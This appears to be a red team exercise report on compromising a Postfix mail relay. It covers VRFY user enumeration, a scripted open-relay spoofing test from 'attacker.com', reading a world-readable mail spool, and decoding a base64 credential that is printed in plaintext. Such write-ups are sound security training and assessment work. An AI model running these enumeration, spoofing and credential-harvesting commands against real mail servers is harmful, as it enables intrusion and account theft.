# Red Team Engagement Report
**Classification:** RESTRICTED — White Team / Exercise Controller Only
**Report ID:** RED-REPORT-IT01-M02
**Version:** 1.0
**Date:** [Date of Exercise]
**Operator:** [Red Team Operator Name / Handle]
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M2 — itgw-mailrelay

---

## 1. Engagement Summary

| Field | Detail |
|---|---|
| Target | PUL Internal SMTP Mail Relay |
| Target IP | `203.x.x.x` |
| Target Port | `25` (SMTP) |
| Attack Class | Mail Protocol Abuse + Filesystem Credential Harvest |
| Objective | Enumerate users; demonstrate open relay; extract SSO credential from mail spool |
| Outcome | **SUCCESSFUL** — Credential `svc-deploy-sso:SSO@Prabal!2024` extracted; M3 pivot ready |
| Pivot From | M1 admin dashboard (mail relay host/port disclosed) |
| Time to Compromise | `[HH:MM]` from M1 completion |

---

## 2. Pre-Engagement Reconnaissance

```bash
nmap -sV -p 25 203.x.x.x
# PORT   STATE SERVICE VERSION
# 25/tcp open  smtp    Postfix smtpd (PUL-IT-Relay/2.1)

nc 203.x.x.x 25
# 220 mail.prabalurja.in ESMTP Postfix (PUL-IT-Relay/2.1)
```

Observation: banner exposes Postfix version and internal hostname `mail.prabalurja.in`.

---

## 3. Vulnerability Analysis

**Vulnerability 1:** `mynetworks = 0.0.0.0/0` — Postfix accepts relay from all IPs without authentication.
**Vulnerability 2:** `disable_vrfy_command = no` — VRFY exposes valid local user accounts.
**Vulnerability 3:** `/var/mail/socanalyst` permissions `644` — world-readable mail spool.
**Vulnerability 4:** Credential stored in base64-encoded custom email header — trivially decodable.

---

## 4. Attack Narrative & Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | Port scan 203.x.x.x | SMTP on port 25 confirmed |
| 2 | T+00:02 | EHLO — inspect capabilities | No AUTH required — open relay |
| 3 | T+00:04 | VRFY socanalyst, it.admin | Both accounts confirmed valid |
| 4 | T+00:06 | Relay test — MAIL FROM/RCPT TO/DATA | `250 Ok: queued` — relay confirmed |
| 5 | T+00:09 | Read `/var/mail/socanalyst` | Mail with `X-Internal-Auth-Token` found |
| 6 | T+00:10 | `base64 -d` on token value | `svc-deploy-sso:SSO@Prabal!2024` decoded |

---

## 5. Commands Executed

```bash
# VRFY enumeration
for user in socanalyst it.admin admin root grid.ops; do
  echo -e "VRFY ${user}\nQUIT" | nc -q2 203.x.x.x 25 | grep -E "^(250|252)"
done

# Open relay demonstration
(
  printf "EHLO attacker.com\r\n"; sleep 0.3
  printf "MAIL FROM: <spoof@attacker.com>\r\n"; sleep 0.3
  printf "RCPT TO: <socanalyst@prabalurja.in>\r\n"; sleep 0.3
  printf "DATA\r\n"; sleep 0.3
  printf "Subject: Relay Test\r\n\r\nOpen relay confirmed.\r\n.\r\n"; sleep 0.3
  printf "QUIT\r\n"
) | nc 203.x.x.x 25

# Read mail spool
cat /var/mail/socanalyst

# Extract and decode the token
grep "X-Internal-Auth-Token" /var/mail/socanalyst | awk '{print $2}' | base64 -d
```

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Discovery | Account Discovery: Local Account | T1087.001 |
| Collection | Email Collection: Local Email Collection | T1114.001 |
| C2 | Application Layer Protocol: Mail Protocols | T1071.003 |
| Credential Access | Unsecured Credentials | T1552 |

---

## 7. Pivot Artifact Obtained

| Artifact | Value |
|---|---|
| Username | `svc-deploy-sso` |
| Password | `SSO@Prabal!2024` |
| Source | `X-Internal-Auth-Token` header in `/var/mail/socanalyst` |
| Next Target | M3 — itgw-sso (Staff Authentication Gateway) |

---

## 8. Evidence

> **[Attach: nc SMTP session output — EHLO, relay acceptance]**

> **[Attach: VRFY output for socanalyst and it.admin]**

> **[Attach: cat /var/mail/socanalyst with X-Internal-Auth-Token visible]**

> **[Attach: base64 -d output showing decoded credential]**

---

**Report Prepared By:** [Red Team Operator]
**White Team Review:** [Exercise Controller]
**Classification:** RESTRICTED
